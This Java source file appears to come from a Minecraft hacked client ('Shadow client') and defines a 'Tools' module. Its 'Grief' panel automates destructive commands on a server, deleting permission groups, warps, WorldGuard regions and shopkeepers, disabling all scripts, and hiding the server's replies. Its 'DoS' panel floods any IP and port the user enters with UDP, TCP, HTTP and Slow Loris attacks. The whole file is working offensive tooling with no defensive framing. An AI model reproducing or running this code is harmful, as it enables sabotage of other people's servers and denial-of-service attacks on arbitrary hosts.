/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.render;

import com.mojang.brigadier.suggestion.Suggestion;
import com.mojang.brigadier.suggestion.Suggestions;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.s2c.play.CommandSuggestionsS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.OpenWrittenBookS2CPacket;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.config.StringSetting;
import net.shadow.client.feature.gui.clickgui.element.Element;
import net.shadow.client.feature.gui.clickgui.element.impl.config.DoubleSettingEditor;
import net.shadow.client.feature.gui.clickgui.element.impl.config.StringSettingEditor;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.feature.gui.notifications.Notification.Type;
import net.shadow.client.feature.gui.panels.PanelsGui;
import net.shadow.client.feature.gui.panels.elements.PanelButton;
import net.shadow.client.feature.gui.panels.elements.PanelFrame;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.event.EventType;
import net.shadow.client.helper.event.Events;
import net.shadow.client.helper.event.events.PacketEvent;
import net.shadow.client.helper.util.DoS;
import net.shadow.client.helper.util.Utils;

import java.io.IOException;
import java.util.Arrays;
import java.util.Random;
import java.util.function.Consumer;

public class ShadowScreen extends Module {

    String packetinputmode = "";
    int blocked = 0;
    boolean enabled = false;
    boolean alt = false;
    PanelsGui menu = null;
    DoubleSetting dsv = new DoubleSetting.Builder(100).min(0).max(100000).name("Packets").get();
    StringSetting ss = new StringSetting.Builder("127.0.0.1:90").name("IP:PORT").get();

    public ShadowScreen() {
        super("Tools", "tools screen", ModuleType.RENDER);
        Events.registerEventHandler(EventType.PACKET_RECEIVE, packet2 -> {
            if (!enabled) return;
            PacketEvent event = (PacketEvent) packet2;
            if (event.getPacket() instanceof OpenWrittenBookS2CPacket && !alt) {
                event.setCancelled(true);
                enabled = false;
            }
            if (event.getPacket() instanceof GameMessageS2CPacket && alt) {
                blocked++;
                event.setCancelled(true);
                if (blocked > 2) {
                    blocked = 0;
                    enabled = false;
                    alt = false;
                }
            }
            if (event.getPacket() instanceof GameMessageS2CPacket packet) {
                String message;
                switch (packetinputmode) {
                    case "worldguard" -> {
                        message = packet.getMessage().getString();
                        if (message.contains("------------------- Regions -------------------")) {
                            message = message.replace("------------------- Regions -------------------", "");
                            message = message.trim();
                            message = message.replace("[Info]", "");
                            message = message.trim();
                            String[] arr = message.trim().split(" ");
                            for (String h : arr) {
                                ShadowMain.client.player.sendChatMessage("/rg delete " + h.strip().replace("\n", "").substring(2, h.length()));
                            }
                            enabled = false;
                        }
                    }
                    case "mrl" -> {
                        message = packet.getMessage().getString();
                        if (message.contains(",")) {
                            message = message.replace(",", "");
                            String[] based = message.split(" ");
                            String[] copied = Arrays.copyOfRange(based, 1, based.length);
                            for (String mrl : copied) {
                                ShadowMain.client.player.sendChatMessage("/mrl erase " + mrl);
                            }
                            enabled = false;
                        }
                    }
                }
            }
            if (event.getPacket() instanceof CommandSuggestionsS2CPacket packet) {
                switch (packetinputmode) {
                    case "lp" -> {
                        Suggestions all = packet.getSuggestions();
                        for (Suggestion i : all.getList()) {
                            ShadowMain.client.player.sendChatMessage("/lp deletegroup " + i.getText());
                        }
                        enabled = false;
                    }
                    case "warps" -> {
                        Suggestions alla = packet.getSuggestions();
                        for (Suggestion i : alla.getList()) {
                            ShadowMain.client.player.sendChatMessage("/delwarp " + i.getText());
                        }
                        enabled = false;
                    }
                }
            }
        });
    }

    @Override
    public void tick() {
    }

    @Override
    public void enable() {
        if (menu == null) {
            menu = new PanelsGui(new PanelFrame[]{
                    new PanelFrame(100, 100, 250, 190, "Grief", new Element[]{
                            new PanelButton(0, 0, -1, "Delete LP Data", () -> {
                                packetinputmode = "lp";
                                enabled = true;
                                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/lp deletegroup "));
                            }),
                            new PanelButton(0, 20, -1, "Delete MRL Data", () -> {
                                packetinputmode = "mrl";
                                enabled = true;
                                ShadowMain.client.player.sendChatMessage("/mrl list");
                            }),
                            new PanelButton(0, 40, -1, "Disable Skripts", () -> ShadowMain.client.player.sendChatMessage("/sk disable all")),
                            new PanelButton(0, 60, -1, "Delete Shopkeepers", () -> new Thread(() -> {
                                ShadowMain.client.player.sendChatMessage("/shopkeeper deleteall admin");
                                Utils.sleep(50);
                                ShadowMain.client.player.sendChatMessage("/shopkeeper confirm");
                            }).start()),
                            new PanelButton(0, 80, -1, "Spam LP Data", () -> {
                                for (int i = 0; i < 100; i++) {
                                    ShadowMain.client.player.sendChatMessage("/lp creategroup " + i + new Random().nextInt(10000));
                                }
                            }),
                            new PanelButton(0, 100, -1, "Delete Warp Data", () -> {
                                packetinputmode = "warps";
                                enabled = true;
                                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/delwarp "));
                            }),
                            new PanelButton(0, 120, -1, "Delete Region Data", () -> {
                                packetinputmode = "worldguard";
                                enabled = true;
                                ShadowMain.client.player.sendChatMessage("/rg list");
                            })
                    }),
                    new PanelFrame(350, 100, 250, 210, "DoS", new Element[]{
                        new DoubleSettingEditor(0, 0, -1, dsv),
                        new StringSettingEditor(0, 20, 240, ss),
                        new PanelButton(0, 50, -1, "UDP", () -> {
                            String[] hostip = ss.getValue().split(":");
                            for (int i = 0; i < dsv.getValue(); i++) {
                                DoS.udp(hostip[0], Integer.parseInt(hostip[1]));
                            }
                        }),
                        new PanelButton(0, 70, -1, "TCP", () -> {
                            String[] hostip = ss.getValue().split(":");
                            for (int i = 0; i < dsv.getValue(); i++) {
                                DoS.tcp(hostip[0], Integer.parseInt(hostip[1]));
                            }
                        }),
                        new PanelButton(0, 90, -1, "HTTP", () -> {
                            for (int i = 0; i < dsv.getValue(); i++) {
                                String[] hostip = ss.getValue().split(":");
                                try {
                                    DoS.http(hostip[0], Integer.parseInt(hostip[1]), "/");
                                } catch (NumberFormatException e) {
                                    e.printStackTrace();
                                }
                            }
                        }),
                        new PanelButton(0, 110, -1, "UDP V2", () -> new Thread(() -> {
                            String[] hostip = ss.getValue().split(":");
                            for (int i = 0; i < dsv.getValue() / 1000; i++) {
                                new Thread(() -> {
                                    DoS.udp2(hostip[0], Integer.parseInt(hostip[1]));
                                }).start();
                            }
                        }).start()),
                        new PanelButton(0, 130, -1, "TCP V2", () -> {
                            String[] hostip = ss.getValue().split(":");
                            for (int i = 0; i < dsv.getValue(); i++) {
                                DoS.tcp2(hostip[0], Integer.parseInt(hostip[1]));
                            }
                        }),
                        new PanelButton(0, 150, -1, "Slow Loris", () -> {
                            for (int i = 0; i < dsv.getValue() / 1000; i++) {
                                String[] hostip = ss.getValue().split(":");
                                try {
                                    DoS.slowLoris(hostip[0], Integer.parseInt(hostip[1]), "/");
                                } catch (NumberFormatException e) {
                                    e.printStackTrace();
                                } catch (IOException e) {
                                    Notification.create(2000, "DoS", Type.SUCCESS, "Server Didn't respond!");
                                }
                            }
                        }),
                        new PanelButton(0, 170, -1, "Slow Loris V2", () -> {
                            for (int i = 0; i < dsv.getValue(); i++) {
                                String[] hostip = ss.getValue().split(":");
                                try {
                                    DoS.ramNibbler(hostip[0], Integer.parseInt(hostip[1]), "/");
                                } catch (NumberFormatException e) {
                                    e.printStackTrace();
                                } catch (IOException e) {
                                    Notification.create(2000, "DoS", Type.SUCCESS, "Server Didn't respond!");
                                }
                            }
                        })
                }),
            });
        }
        ShadowMain.client.setScreen(menu);
        this.setEnabled(false);
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
